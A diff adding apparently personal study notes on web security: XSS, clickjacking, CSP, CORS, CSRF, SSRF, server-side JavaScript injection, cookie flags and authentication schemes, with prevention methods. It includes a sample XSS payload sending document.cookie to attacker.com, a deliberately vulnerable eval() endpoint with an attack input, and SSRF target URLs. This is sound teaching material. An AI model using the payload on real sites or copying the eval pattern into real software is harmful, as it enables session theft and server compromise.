@@ -1,0 +1,400 @@
+1. Cross-Site Scripting (XSS)
+
+    Cross-Site Scripting (XSS) is a security vulnerability where an attacker injects malicious JavaScript into a website, 
+    and that script runs in the browser of other users who visit the page.
+
+    a) Stored XSS (Persistent XSS)
+
+        The malicious script is stored in the database and served to every user.
+
+        Attacker submits comment (eg: <script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>) → stored in DB
+        ↓
+        Other users load the page
+        ↓
+        Browser executes malicious script
+
+    b) DOM-Based XSS
+
+        DOM-based XSS happens when frontend JavaScript reads user input and inserts it into the DOM without sanitization.
+
+        element.innerHTML = userInput
+
+    Prevention methods:
+        1) Avoid Dangerous DOM APIs
+            element.innerHTML
+            document.write()
+            insertAdjacentHTML()
+
+        2) Use Framework Auto-Escaping
+            If comment contains: <script>alert(1)</script>
+            React renders:&lt;script&gt;alert(1)&lt;/script&gt; -> So the script does not run.
+            Dont use like this -> <div dangerouslySetInnerHTML={{ __html: comment }} />
+
+        3) Use HTTPOnly Cookies
+            Even if XSS happens, attackers cannot access cookies via JavaScript
+
+            Set-Cookie: sessionId=abc123; HttpOnly
+
+            This prevents: -> document.cookie
+
+        4) Implement Content Security Policy (CSP)
+            CSP restricts what scripts can execute.
+
+            Content-Security-Policy: script-src 'self'
+
+            This blocks: <script>alert(1)</script> -> if it is injected.
+
+2. iFrame Protection (Clickjacking Protection)
+
+    iFrame Protection prevents malicious websites from embedding your webpage inside an iframe to perform clickjacking attacks.
+
+    User visits attacker website
+            ↓
+    Attacker embeds target website in iframe
+            ↓
+    Iframe is hidden or transparent
+            ↓
+    User clicks fake UI
+            ↓
+    Real action happens on embedded website
+
+    Prevention methods:
+
+    X-Frame-Options Header (Most Common):
+    X-Frame-Options: DENY -> No website can embed this page in an iframe
+    X-Frame-Options: SAMEORIGIN
+
+    Content Security Policy (Modern Solution):
+    Content-Security-Policy: frame-ancestors 'none' -> No site can embed this page
+    Content-Security-Policy: frame-ancestors 'self' -> Allow specific domains:
+
+3. Content Security Policy (CSP)
+
+    Content Security Policy (CSP) is a browser security mechanism that restricts which resources (scripts, styles, images, etc.) 
+    are allowed to load on a webpage.
+
+    It helps prevent attacks like:
+
+    Cross-Site Scripting (XSS)
+    Malicious script injection
+    Data injection attacks
+
+    Content-Security-Policy:
+    default-src 'self';
+    script-src 'self' https://cdn.example.com;
+    style-src 'self' https://fonts.googleapis.com;
+    img-src 'self' https://images.example.com;
+    connect-src 'self' https://api.example.com;
+    frame-ancestors 'none';
+    object-src 'none'
+
+4. CORS:
+
+    CORS is a browser security mechanism that allows or restricts web pages from making requests to a different origin than the one that served the page.
+
+    How CORS Works: 
+
+    Frontend → Browser → API Server
+    GET https://api.example.com/data
+    Origin: https://app.example.com
+    Access-Control-Allow-Origin: https://app.example.com
+
+    If allowed → Browser gives response to frontend
+    If not allowed → Browser blocks it
+
+    Important:
+    ⚠️ Server still sends the response, but the browser blocks it.
+
+    Example:
+
+    User logs into bank.com
+            ↓
+    Browser stores session cookie
+            ↓
+    User visits evil.com
+            ↓
+    evil.com sends request to bank.com API
+            ↓
+    Browser automatically attaches bank session cookie
+            ↓
+    Bank server thinks request is from logged-in user
+            ↓
+    Potential unauthorized action (e.g., money transfer)
+            ↓
+    Security protections stop this:
+    Same-Origin Policy + CORS + CSRF Tokens + SameSite Cookies
+
+5. CSRF (Cross-Site Request Forgery)
+
+    CSRF is an attack where a malicious website tricks a logged-in user’s browser into sending an unauthorized request to another website.
+
+    A CSRF attack works because browsers automatically send cookies with requests to the same domain.
+
+    User logs into bank.com
+            ↓
+    Browser stores session cookie
+            ↓
+    User visits evil.com
+            ↓
+    evil.com sends request to bank.com
+            ↓
+    Browser automatically attaches bank cookie
+            ↓
+    Server thinks request is from authenticated user
+            ↓
+    Unauthorized action happens (e.g., money transfer)
+
+    Prevention:
+
+    1) CSRF Token
+
+    User logs into bank.com
+            ↓
+    Server generates a unique CSRF token
+            ↓
+    Token sent to frontend (in HTML/meta/API)
+            ↓
+    Frontend includes token in every sensitive request
+            ↓
+    Server verifies token before processing request
+            ↓
+    If token missing/invalid → request rejected
+
+    2) SameSite Cookies
+    3) Check Origin / Referer Header
+
+6. Server-Side Request Forgery (SSRF)
+
+    Server-Side Request Forgery (SSRF) is an attack where a malicious user tricks a server into sending requests to internal or external systems, 
+    potentially exposing sensitive data or internal services.
+
+    Normally, servers sometimes fetch data from external URLs (for example: image preview, webhook validation, metadata fetch, etc.).
+
+    If the server accepts a user-provided URL without validation, an attacker can make the server send requests to unintended locations.
+
+    User sends URL input to server
+            ↓
+    Server fetches the URL
+            ↓
+    Attacker provides malicious URL
+            ↓
+    Server sends request to internal/private service
+            ↓
+    Attacker gains access to sensitive data
+
+    Example: 
+    Server code:
+
+    fetch(imageUrl)
+
+    Normal Request
+    imageUrl = https://images.com/photo.jpg
+
+    Malicious Request
+
+    Attacker sends:
+
+    imageUrl = http://localhost:3000/admin
+
+    Attackers often try to access:
+
+    Internal services
+    http://localhost
+    http://127.0.0.1
+    http://internal-service\
+
+    Prevention:
+    Validate URLs properly
+
+7. Server-side JavaScript Injection (SSJI)
+
+    Server-Side JavaScript Injection (SSJI) occurs when user input is executed as JavaScript on the server (e.g., via eval()), allowing attackers to run malicious code. 
+    It can be prevented by avoiding dynamic code execution and validating inputs.
+
+    How SSJI Works
+    Vulnerable Example (Node.js)
+    app.get("/calculate", (req, res) => {
+    const result = eval(req.query.expression);
+    res.send(result);
+    });
+
+    User request:
+
+    /calculate?expression=2+2
+
+    Server returns:
+
+    4
+
+    But an attacker sends:
+
+    /calculate?expression=process.exit()
+
+    Now the server executes malicious code, potentially crashing the server or accessing sensitive data.
+
+8. Subresource Integrity (SRI)
+
+    Subresource Integrity (SRI) ensures that files loaded from external sources have not been modified by verifying them with a cryptographic hash before execution.
+
+    How SRI Works:
+    The developer generates a hash of the file.
+    The hash is added to the HTML tag.
+    The browser downloads the file.
+    The browser calculates its hash.
+    If the hashes match, the file executes.
+    If the hashes do not match, the browser blocks the resource.
+
+9. SameSite cookies, Secure Cookies, Security headers
+
+    HttpOnly Cookie 🔐
+    A cookie flag that prevents JavaScript from accessing the cookie, protecting it from XSS attacks.
+
+    Example:
+
+    Set-Cookie: sessionId=abc123; HttpOnly
+
+    Meaning: document.cookie cannot read this cookie.
+
+    Secure Cookie 🌐
+    A cookie flag that ensures the cookie is only sent over HTTPS connections, preventing interception on insecure networks.
+
+    Example:
+
+    Set-Cookie: sessionId=abc123; Secure
+
+    Meaning: Cookie is sent only to https://example.com
+    , not http://example.com
+    .
+
+    SameSite Cookie 🛡️
+    A cookie attribute that restricts cookies from being sent in cross-site requests, helping prevent CSRF attacks.
+
+    Example:
+
+    Set-Cookie: sessionId=abc123; SameSite=Strict
+
+    Meaning: Cookie is not sent when requests come from another site (e.g., evil.com → bank.com).
+
+    Many applications combine all three:
+
+    Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
+
+    Meaning:
+
+    HttpOnly → JS cannot read cookie
+    Secure → sent only via HTTPS
+    SameSite → protected from CSRF
+
+10. Avoid Exposing Sensitive Data (API secret keys, UNDERSTAND deeply)
+
+    Avoid exposing sensitive data by never including secret keys in frontend code since the browser environment is public and easily inspectable; 
+    instead keep secrets on the backend and access external services through secure server APIs.
+
+    ✅ Frontend Security Rule
+
+    If the browser can download it,
+    the user can read it.
+
+11. Why JWT Tokens Are Stored in Cookies (Instead of LocalStorage or other)
+
+    Protection from XSS
+    HttpOnly Flag
+    Automatic Request Handling
+    Secure Cookie Flag
+    SameSite Protection (CSRF Prevention)
+    Easy Expiration Control
+    Server-Side Control
+
+12. Refresh Token & Access Token
+
+    If we use only one long-lived access token, it creates a major security risk.
+    If an attacker steals this token, they can access the user's account for long days.
+
+    To reduce this risk, we use:
+
+    Short-lived Access Token + Refresh Token
+
+    User Login
+        ↓
+    Access Token (15 min)
+    Refresh Token (7 days)
+
+        ↓
+    API Request → Access Token
+        ↓
+    Access Token Expired
+        ↓
+    Send Refresh Token
+        ↓
+    Server issues New Access Token
+
+13. Authentication vs Authorization
+
+    Authentication verifies the identity of a user, while authorization determines what actions or resources that authenticated user is allowed to access.
+
+14. OAuth / JWT / Session based authentication
+
+    a) Session-Based Authentication:
+
+    Server stores user sessions and identifies users using session IDs.
+    Session authentication stores user login state on the server, and the browser stores only a session ID in cookies.
+
+    User Login
+    ↓
+    Server verifies credentials
+    ↓
+    Server creates session in DB
+    ↓
+    Server sends session ID cookie
+    ↓
+    Browser sends session ID in each request
+
+    Example cookie
+
+    Set-Cookie: sessionId=abc123
+
+    Server stores:
+
+    sessionId → user data
+
+    b) JWT Authentication (Token-Based):
+
+        JWT authentication uses a signed token containing user information, stored on the client and sent with every request.
+
+        User Login
+        ↓
+        Server verifies credentials
+        ↓
+        Server generates JWT
+        ↓
+        Client stores JWT
+        ↓
+        Client sends token in requests
+
+    c) OAuth (Third-Party Authentication):
+
+        OAuth allows users to log in using another service without sharing their password.
+
+15. Check Origin / Referer Header
+
+    Origin Header
+    What it contains
+
+    The Origin header contains only the domain that initiated the request.
+    Server detects invalid origin → request blocked.
+
+    Referer Header
+    What it contains
+
+    Referer contains the full URL of the page that made the request.
+
+    Example:
+
+    Referer: https://mybank.com/account
+
+    Server checks:
+
+    Does Referer start with https://mybank.com ?
+
+    If yes → allow request.
+
